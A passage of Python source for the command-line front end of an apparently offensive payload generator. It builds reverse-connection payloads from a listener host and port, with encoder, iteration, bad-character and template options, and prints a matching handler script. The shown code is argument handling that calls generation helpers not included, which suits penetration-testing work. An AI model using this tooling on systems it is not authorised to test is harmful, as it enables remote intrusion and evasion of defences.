zimzilla/payload.py for the traps that makes worth recording.
"""


def _cmd_list() -> int:
    print(f"{'ext':<8} {'format':<16} {'payload':<44} runs on")
    print("-" * 110)
    for ext in extensions():
        spec = SPECS[ext]
        fmt = spec.format or "(implied)"
        print(f"{ext:<8} {fmt:<16} {spec.payload:<44} {spec.runs_on}")
    return 0


def main(argv: list[str] | None = None) -> int:
    import argparse

    args = list(sys_argv() if argv is None else argv)
    if not args or args[0] in ("-h", "--help", "help"):
        print(_USAGE)
        return 0
    if args[0] in ("list", "ls", "--list"):
        return _cmd_list()

    parser = argparse.ArgumentParser(prog="zimzilla.payload", add_help=False)
    parser.add_argument("ext")
    parser.add_argument("--lhost", default=None)
    parser.add_argument("--lport", type=int, default=DEFAULT_LPORT)
    parser.add_argument("--payload", default=None)
    parser.add_argument("--encoder", default=None)
    parser.add_argument("--iterations", type=int, default=None)
    parser.add_argument("--bad-chars", default=None)
    parser.add_argument("--template", default=None)
    parser.add_argument("--out", default=None)
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--handler", action="store_true")
    ns, _unknown = parser.parse_known_args(args)

    spec = resolve(ns.ext)
    if spec is None:
        print(f"unknown extension: {ns.ext}\n\n{_USAGE}", file=sys_stderr())
        return 2

    lhost = ns.lhost or default_lhost()
    if ns.handler:
        print(handler_rc(spec, lhost, ns.lport, ns.payload))
        return 0

    out = Path(ns.out) if ns.out else Path.cwd() / output_name(spec, ns.payload)
    template = Path(ns.template) if ns.template else None
    if ns.dry_run:
        print(" ".join(_quote(a) for a in build_argv(
            spec, lhost=lhost, lport=ns.lport, out=out, payload=ns.payload,
            encoder=ns.encoder, iterations=ns.iterations,
            bad_chars=ns.bad_chars, template=template,
        )))
        return 0

    build = generate(
        spec, lhost=lhost, lport=ns.lport, out=out, payload=ns.payload,
        encoder=ns.encoder, iterations=ns.iterations, bad_chars=ns.bad_chars,
        template=template,
    )
    if not build.ok:
        print(f"build failed: {build.error}", file=sys_stderr())
        return 1
    print(f"{build.out}  {human_size(build.size)}  {build.sha256[:16]}")
    print()
    print(handler_rc(spec, lhost, ns.lport, ns.payload))
    return 0


def sys_argv() -> list[str]:
    import sys
    return sys.argv[1:]


def sys_stderr():
    import sys
    return sys.stderr


if __name__ == "__main__":
    raise SystemExit(main())
